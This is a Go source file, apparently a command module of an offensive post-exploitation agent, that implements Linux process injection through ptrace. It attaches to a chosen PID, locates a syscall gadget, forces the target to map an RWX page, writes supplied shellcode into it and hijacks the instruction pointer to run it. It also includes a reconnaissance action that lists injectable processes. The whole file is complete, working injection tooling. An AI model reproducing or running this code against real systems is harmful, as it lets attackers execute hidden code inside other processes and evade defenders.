//go:build linux && amd64

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

type PtraceInjectCommand struct{}

func (c *PtraceInjectCommand) Name() string { return "ptrace-inject" }
func (c *PtraceInjectCommand) Description() string {
	return "Linux process injection via ptrace syscall (T1055.008)"
}

type ptraceInjectArgs struct {
	Action       string `json:"action"`        // check, inject
	PID          int    `json:"pid"`           // Target process ID
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode
	Restore      *bool  `json:"restore"`       // Restore original code after execution (default: true)
	Timeout      int    `json:"timeout"`       // Timeout in seconds waiting for shellcode (default: 30)
}

func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: check, inject",
			Status:    "error",
			Completed: true,
		}
	}

	var args ptraceInjectArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	action := strings.ToLower(args.Action)
	if action == "" {
		action = "inject"
	}

	switch action {
	case "check":
		return ptraceCheck()
	case "inject":
		return ptraceInject(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: check, inject", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func ptraceCheck() structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Ptrace Configuration\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// Check ptrace_scope (Yama LSM)
	if scope, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); err == nil {
		val := strings.TrimSpace(string(scope))
		sb.WriteString(fmt.Sprintf("ptrace_scope: %s", val))
		switch val {
		case "0":
			sb.WriteString(" (classic — any process can ptrace same-UID processes)\n")
		case "1":
			sb.WriteString(" (restricted — only parent can ptrace child, or CAP_SYS_PTRACE)\n")
		case "2":
			sb.WriteString(" (admin-only — requires CAP_SYS_PTRACE)\n")
		case "3":
			sb.WriteString(" (disabled — no ptrace allowed)\n")
		default:
			sb.WriteString("\n")
		}
	} else {
		sb.WriteString("ptrace_scope: not available (Yama LSM not loaded)\n")
	}

	sb.WriteString(fmt.Sprintf("\nCurrent UID:  %d\n", os.Getuid()))
	sb.WriteString(fmt.Sprintf("Current EUID: %d\n", os.Geteuid()))

	if os.Geteuid() == 0 {
		sb.WriteString("\nRunning as root — ptrace should work on all processes\n")
	}

	// Show capabilities from /proc/self/status
	if status, err := os.ReadFile("/proc/self/status"); err == nil {
		sb.WriteString("\nCapabilities:\n")
		for _, line := range strings.Split(string(status), "\n") {
			if strings.HasPrefix(line, "Cap") {
				sb.WriteString(fmt.Sprintf("  %s\n", line))
			}
		}
	}

	// List candidate processes (same UID)
	sb.WriteString("\nCandidate Processes (same UID):\n")
	entries, _ := os.ReadDir("/proc")
	uid := os.Getuid()
	count := 0
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		var pid int
		if _, err := fmt.Sscanf(e.Name(), "%d", &pid); err != nil {
			continue
		}
		if pid == os.Getpid() {
			continue
		}
		statusPath := fmt.Sprintf("/proc/%d/status", pid)
		data, err := os.ReadFile(statusPath)
		if err != nil {
			continue
		}
		var procUID int
		var procName string
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "Name:") {
				procName = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
			}
			if strings.HasPrefix(line, "Uid:") {
				_, _ = fmt.Sscanf(strings.TrimPrefix(line, "Uid:"), "%d", &procUID)
			}
		}
		if procUID == uid || os.Geteuid() == 0 {
			sb.WriteString(fmt.Sprintf("  PID %-7d %s\n", pid, procName))
			count++
			if count >= 20 {
				sb.WriteString("  ... (truncated)\n")
				break
			}
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
	if args.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: valid pid required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 required (base64-encoded shellcode)",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	restore := true
	if args.Restore != nil {
		restore = *args.Restore
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 30
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", args.PID))
	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))

	// Verify target process exists
	if _, err := os.Stat(fmt.Sprintf("/proc/%d", args.PID)); err != nil {
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Process %d not found\n", args.PID),
			Status:    "error",
			Completed: true,
		}
	}

	// Lock the OS thread — ptrace requires all operations from the same thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Step 1: Attach to the process
	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
	if err := syscall.PtraceAttach(args.PID); err != nil {
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Wait for the process to stop (SIGSTOP)
	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString("[+] Process stopped\n")

	// Step 2: Save original registers
	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))

	// Step 3: Find a syscall gadget in the target process
	syscallAddr, err := findSyscallGadget(args.PID)
	if err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))

	// Step 4: Use ptrace syscall injection to call mmap and get an RWX page
	// mmap(NULL, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if restore {
		scSize++ // room for INT3
	}
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	var mmapRegs syscall.PtraceRegs
	mmapRegs = origRegs
	mmapRegs.Rip = syscallAddr
	mmapRegs.Rax = 9                      // SYS_mmap
	mmapRegs.Rdi = 0                      // addr = NULL (kernel chooses)
	mmapRegs.Rsi = pageSize               // length
	mmapRegs.Rdx = 7                      // PROT_READ|PROT_WRITE|PROT_EXEC
	mmapRegs.R10 = 0x22                   // MAP_PRIVATE|MAP_ANONYMOUS
	mmapRegs.R8 = 0xffffffffffffffff      // fd = -1
	mmapRegs.R9 = 0                       // offset = 0

	if err := syscall.PtraceSetRegs(args.PID, &mmapRegs); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Failed to set mmap registers: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Single-step to execute the syscall instruction
	if err := syscall.PtraceSingleStep(args.PID); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_SINGLESTEP failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Wait4 after mmap failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Read the mmap return value from RAX
	if err := syscall.PtraceGetRegs(args.PID, &mmapRegs); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Failed to read mmap result: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	rwxAddr := mmapRegs.Rax
	// mmap returns MAP_FAILED (-1 as unsigned) on error
	if rwxAddr >= 0xfffffffffffff000 {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] mmap failed (returned 0x%X)\n", rwxAddr),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] mmap allocated RWX page at 0x%X (%d bytes)\n", rwxAddr, pageSize))

	// Step 5: Build injection code — shellcode + optional INT3 trailer
	injectionCode := make([]byte, len(shellcode))
	copy(injectionCode, shellcode)
	if restore {
		injectionCode = append(injectionCode, 0xCC) // INT3 to signal completion
	}

	// Step 6: Write shellcode to the RWX page
	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwxAddr), injectionCode); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] Failed to write shellcode to RWX page: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwxAddr))

	// Step 7: Set RIP to the shellcode in the RWX page
	newRegs := origRegs
	newRegs.Rip = rwxAddr
	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwxAddr))

	// Step 8: Continue execution
	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(args.PID, 0); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return structs.CommandResult{
			Output:    sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	if restore {
		// Step 9: Wait for INT3 (SIGTRAP) with timeout
		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
		stopped := false
		for time.Now().Before(deadline) {
			wpid, err := syscall.Wait4(args.PID, &ws, syscall.WNOHANG, nil)
			if err != nil {
				sb.WriteString(fmt.Sprintf("[!] Wait4 error: %v\n", err))
				break
			}
			if wpid > 0 {
				stopped = true
				break
			}
			time.Sleep(50 * time.Millisecond)
		}

		if !stopped {
			sb.WriteString(fmt.Sprintf("[!] Timeout after %ds waiting for shellcode completion\n", timeout))
			sb.WriteString("[*] Detaching without restore (shellcode may still be running)\n")
			_ = syscall.PtraceDetach(args.PID)
			return structs.CommandResult{
				Output:    sb.String(),
				Status:    "success",
				Completed: true,
			}
		}

		if ws.StopSignal() == syscall.SIGTRAP {
			sb.WriteString("[+] Shellcode completed (SIGTRAP received)\n")
		} else {
			sb.WriteString(fmt.Sprintf("[*] Process stopped with signal %d\n", ws.StopSignal()))
		}

		// Step 10: Clean up — munmap the RWX page
		var munmapRegs syscall.PtraceRegs
		munmapRegs = origRegs
		munmapRegs.Rip = syscallAddr
		munmapRegs.Rax = 11           // SYS_munmap
		munmapRegs.Rdi = rwxAddr      // addr
		munmapRegs.Rsi = pageSize     // length
		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
			if err := syscall.PtraceSingleStep(args.PID); err == nil {
				_, _ = syscall.Wait4(args.PID, &ws, 0, nil)
				sb.WriteString("[+] Cleaned up RWX page (munmap)\n")
			}
		}

		// Step 11: Restore original registers
		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
		} else {
			sb.WriteString("[+] Restored original registers\n")
		}
	}

	// Step 12: Detach
	if err := syscall.PtraceDetach(args.PID); err != nil {
		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString("[+] Ptrace injection completed successfully\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// findSyscallGadget scans r-xp memory regions for a syscall instruction (0x0F 0x05).
// Uses /proc/<pid>/mem for reading, which works on both self and ptrace-attached processes.
func findSyscallGadget(pid int) (uint64, error) {
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	data, err := os.ReadFile(mapsPath)
	if err != nil {
		return 0, fmt.Errorf("cannot read %s: %v", mapsPath, err)
	}

	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	memFile, err := os.Open(memPath)
	if err != nil {
		return 0, fmt.Errorf("cannot open %s: %v", memPath, err)
	}
	defer memFile.Close()

	for _, line := range strings.Split(string(data), "\n") {
		if line == "" {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}

		perms := parts[1]
		if len(perms) < 4 || perms[0] != 'r' || perms[2] != 'x' {
			continue
		}
		// Skip vdso/vsyscall
		if len(parts) >= 6 {
			name := parts[len(parts)-1]
			if strings.Contains(name, "vdso") || strings.Contains(name, "vsyscall") {
				continue
			}
		}

		addrParts := strings.Split(parts[0], "-")
		if len(addrParts) != 2 {
			continue
		}
		var startAddr, endAddr uint64
		if _, err := fmt.Sscanf(addrParts[0], "%x", &startAddr); err != nil {
			continue
		}
		if _, err := fmt.Sscanf(addrParts[1], "%x", &endAddr); err != nil {
			continue
		}

		// Scan this region for syscall instruction (0x0F 0x05)
		chunkSize := uint64(4096)
		buf := make([]byte, chunkSize)
		for addr := startAddr; addr < endAddr-1; addr += chunkSize {
			readSize := chunkSize
			if addr+readSize > endAddr {
				readSize = endAddr - addr
			}
			n, err := memFile.ReadAt(buf[:readSize], int64(addr))
			if err != nil || n < 2 {
				break
			}
			for i := 0; i < n-1; i++ {
				if buf[i] == 0x0F && buf[i+1] == 0x05 {
					return addr + uint64(i), nil
				}
			}
		}
	}

	return 0, fmt.Errorf("no syscall gadget found in process %d", pid)
}
